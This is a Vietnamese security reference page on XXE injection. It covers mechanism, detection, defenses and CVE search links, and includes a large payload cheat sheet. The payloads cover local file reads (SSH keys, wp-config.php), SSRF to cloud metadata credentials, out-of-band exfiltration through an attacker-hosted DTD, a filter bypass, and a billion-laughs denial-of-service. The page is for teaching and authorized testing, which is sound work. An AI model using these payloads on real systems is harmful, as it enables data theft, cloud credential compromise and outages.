# XML External Entity Injection

> Một parser XML phân giải các external entity do kẻ tấn công định nghĩa, phơi bày file hoặc gây SSRF. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/xxe.md`](../../../../Troubleshooting_Guide/xxe.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** XXE · A05:2021 Misconfiguration
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
XML External Entity (XXE) injection xảy ra khi một ứng dụng phân tích XML cho phép kẻ tấn công định
nghĩa và tham chiếu các external entity, và parser phân giải chúng. Vì một external entity có thể trỏ
tới một đường dẫn file hoặc URL, parser sẽ lấy tài nguyên đó và nhúng nó vào tài liệu, phơi bày các
file cục bộ hoặc thực hiện các request phía máy chủ.

## Cơ chế hoạt động (How it works)
DTD của XML cho phép một tài liệu khai báo các entity, bao gồm cả entity ngoài qua `SYSTEM "file://..."`
hoặc `SYSTEM "http://..."`. Một parser được cấu hình để xử lý DTD và external entity sẽ giải tham
chiếu chúng trong khi phân tích. Kẻ tấn công kiểm soát đầu vào XML; sai lầm của ứng dụng là dùng một
parser cấu hình mặc định hoặc cũ kỹ vốn phân giải các external entity và DTD. Khi entity đã phân giải
được phản chiếu trong một phản hồi thì đó là một lần đọc trực tiếp; khi không, các parameter entity
(`%`) cùng một external DTD do kẻ tấn công host biến nó thành một kênh out-of-band mù hoặc dựa trên lỗi.

## Tác động (Impact)
Tiết lộ các file cục bộ tùy ý (thông tin xác thực, khóa, mã nguồn), server-side request forgery tới
các dịch vụ nội bộ và endpoint metadata cloud (ví dụ thông tin xác thực AWS IAM), và trong một số
parser là từ chối dịch vụ qua việc bung entity đệ quy ("billion laughs"). Một số cấu hình cho phép
leo thang hướng tới RCE qua các trình xử lý URL nguy hiểm. Mức độ nghiêm trọng thường là cao đến
nghiêm trọng.

## Cách phát hiện (How to detect)
- Một phép thử internal-entity (`<!ENTITY x "TEST_123">` được tham chiếu bằng `&x;`) được phản chiếu
  lại, xác nhận các entity được xử lý.
- Một entity `file://` trong một trường được phản chiếu trả về nội dung file trong phản hồi.
- Mù: một entity `SYSTEM "http://collaborator"` (general hoặc parameter) tạo ra một lượt truy cập
  HTTP/DNS đến trên một host do bạn kiểm soát.
- Dựa trên lỗi: trỏ một entity vào một đường dẫn không hợp lệ làm lộ nội dung file bên trong thông
  báo lỗi của parser.

## Khai thác (tóm tắt) (Exploitation)
Đầu tiên xác nhận XML được phân tích và DTD/entity được cho phép, rồi định nghĩa một external entity
trỏ tới `file://` (đọc) hoặc `http://` (SSRF). Nếu giá trị được phản chiếu, đọc nó trực tiếp; nếu mù,
dùng một parameter entity cộng với một external DTD do kẻ tấn công host để rò rỉ out-of-band hoặc qua
lỗi phân tích, lùi về tái dụng local DTD khi các lượt fetch ngoài bị chặn. Nơi bạn không kiểm soát
được toàn bộ tài liệu, dùng XInclude; XXE cũng đi kèm bên trong SVG, tài liệu Office, SOAP, và các
feed. Payload đầy đủ nằm trong phần Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Trinh sát — XML có được xử lý không, DTD có được cho phép không? (Recon — is XML processed, are DTDs allowed?)
Gửi các phép thử tăng dần: XML thuần, rồi một internal entity, rồi một DOCTYPE. Nếu `TEST_123` được phản chiếu, các entity được xử lý; nếu DOCTYPE không gây lỗi, DTD được cho phép.

```xml
<?xml version="1.0"?><test>hello</test>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x "TEST_123">]><test>&x;</test>
<?xml version="1.0"?><!DOCTYPE foo SYSTEM ""><test>hello</test>
```

### XXE cơ bản — đọc file cục bộ (Basic XXE — read local files)
Định nghĩa một external entity và tham chiếu nó trong một trường được phản chiếu.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Các mục tiêu giá trị cao theo nền tảng:

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/version">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">
```

### SSRF qua XXE (SSRF via XXE)
Thay URL `file://` bằng một URL HTTP để tới được các dịch vụ nội bộ và metadata cloud.

```xml
<!-- AWS EC2 metadata (enumerate iteratively) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
<!-- GCP metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- internal services -->
<!ENTITY xxe SYSTEM "http://localhost:80/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
<!ENTITY xxe SYSTEM "http://internal-admin.local/">
```

### XXE mù — phát hiện out-of-band (Blind XXE — out-of-band detection)
Không có phản chiếu: xác nhận việc phân tích bằng cách ép một request ra ngoài. Các parameter entity (`%`) hoạt động ở nơi các general entity bị loại bỏ trong tập con DTD.

```xml
<!-- simple OOB -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER.com/xxe-test"> ]>
<!-- parameter entity variant -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/xxe-test">
  %xxe;
]>
```

### XXE mù — rò rỉ qua external DTD (Blind XXE — exfiltration via external DTD)
Host một DTD đọc một file và nối nó vào một request gửi lại máy chủ của bạn.

```xml
<!-- malicious.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- trigger from victim -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/malicious.dtd">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### XXE mù — rò rỉ dựa trên lỗi (Blind XXE — error-based exfiltration)
Khi không tồn tại kênh OOB, tham chiếu nội dung file bên trong một đường dẫn không hợp lệ; lỗi phân tích sẽ làm rò rỉ chúng.

```xml
<!-- error.dtd: SYSTEM points the file into a nonexistent path -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
<!-- error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:... -->
```

### Tái dụng local DTD (external DTD bị chặn) (Local DTD repurposing (external DTD blocked))
Định nghĩa lại một entity bên trong một DTD vốn đã tồn tại trên hệ thống file mục tiêu.

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Các đường dẫn local DTD thường gặp: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`, `/etc/xml/catalog`.

### XInclude (không kiểm soát được toàn bộ tài liệu) (XInclude (can't control the full document))
Khi đầu vào được chèn vào một tài liệu XML do máy chủ dựng, bạn không thể khai báo một DOCTYPE — hãy dùng XInclude thay thế.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Các vector tải file / content-type (File-upload / content-type vectors)
Nhúng XXE vào bất kỳ định dạng dẫn xuất từ XML nào mà máy chủ phân tích.

```xml
<!-- SVG upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```

```xml
<!-- DOCX/XLSX/PPTX: edit word/document.xml or xl/sharedStrings.xml inside the zip -->
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document><paragraph>&xxe;</paragraph></document>
```

```bash
unzip document.docx -d extracted/
# edit the XML part, add the XXE payload, then repackage
cd extracted && zip -r ../malicious.docx *
```

```xml
<!-- RSS/Atom feed -->
<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "http://internal-admin-panel.local/"> ]>
<rss version="2.0"><channel><description>&xxe;</description></channel></rss>
```

```xml
<!-- SOAP body -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><getUserInfo><userId>&xxe;</userId></getUserInfo></soap:Body>
</soap:Envelope>
```

### Vượt bằng mã hóa & wrapper (Encoding & wrapper bypasses)
Đánh bại các bộ lọc từ khóa và đọc file nhị phân/PHP.

```xml
<!-- UTF-7 (bypasses filters that scan for "<!DOCTYPE") -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

```xml
<!-- PHP filter wrapper: base64-encode so source isn't parsed as markup -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php">
]>
<root>&xxe;</root>
```

```xml
<!-- Java URL handlers -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### Từ chối dịch vụ — billion laughs (Denial of service — billion laughs)
Việc bung entity lồng nhau làm cạn kiệt bộ nhớ; chỉ dùng khi có cấp phép rõ ràng.

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ...nest through lol9... -->
]>
<lolz>&lol9;</lolz>
```

### Hướng dẫn lựa chọn (Selection guide)

| Tình huống | Cách tiếp cận |
|-----------|----------|
| XXE cơ bản, dữ liệu được phản chiếu | internal entity + `SYSTEM file://` |
| SSRF / metadata cloud | `SYSTEM` với URL HTTP |
| Mù, không phản chiếu | parameter entity + external DTD (OOB) |
| Mù, external DTD bị chặn | tái dụng local DTD |
| Mù dựa trên lỗi | external DTD tham chiếu một đường dẫn file không hợp lệ |
| Không kiểm soát được toàn bộ XML | XInclude |
| Tải SVG / ảnh | XXE bên trong XML của SVG |
| Tài liệu Office | XXE trong `word/document.xml` hoặc `xl/*.xml` |
| Dịch vụ SOAP | XXE trong `Body` của SOAP |
| Bộ lọc trên `<!DOCTYPE` | mã hóa UTF-7 |
| Cần mã nguồn nhị phân/PHP | wrapper base64 `php://filter` |

## Phòng chống (Defenses)
1. **Tắt DTD và external entity** trong parser XML — bản vá hiệu quả nhất duy nhất
   (ví dụ `disallow-doctype-decl`, `FEATURE_SECURE_PROCESSING`, đặt `external-general-entities` và
   `external-parameter-entities` thành false; `libxml_disable_entity_loader`/không `LIBXML_NOENT`).
2. **Ưu tiên các định dạng dữ liệu đơn giản hơn** (JSON) nơi không cần XML, và dùng một cấu hình
   parser đã được làm cứng theo mặc định.
3. **Tắt XInclude** và đặt giới hạn bung entity để làm cùn DOS, và hạn chế truy cập mạng/file của parser.
4. Xác thực và làm sạch các định dạng dẫn xuất từ XML được tải lên (SVG, DOCX) qua cùng parser đã làm cứng.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=XML+External+Entity+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=XML+External+Entity+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=XML+External+Entity+Injection
- **GitHub Advisories** — https://github.com/advisories?query=XML+External+Entity+Injection
- **OSV** — https://osv.dev/list?q=XML+External+Entity+Injection
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `XML External Entity Injection <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2014-3529` / `CVE-2014-3574` — XXE trong Apache POI / Tika qua việc phân tích Office Open XML.
- `CVE-2018-1000550` — XXE trong một thư viện được dùng rộng rãi dẫn tới tiết lộ file và SSRF.
- _Ví dụ kinh điển: các bug bounty XXE lớp PayPal/Facebook năm 2014, và các vấn đề XXE data-binding
  XML của Spring/Jackson vốn đã thúc đẩy các thay đổi parser "an toàn theo mặc định"._

## Tham khảo (References)
- PortSwigger Web Security Academy — XML external entity (XXE) injection.
- OWASP — XML External Entity Prevention Cheat Sheet.
- W3C — đặc tả XML 1.0 (định nghĩa entity và DTD).
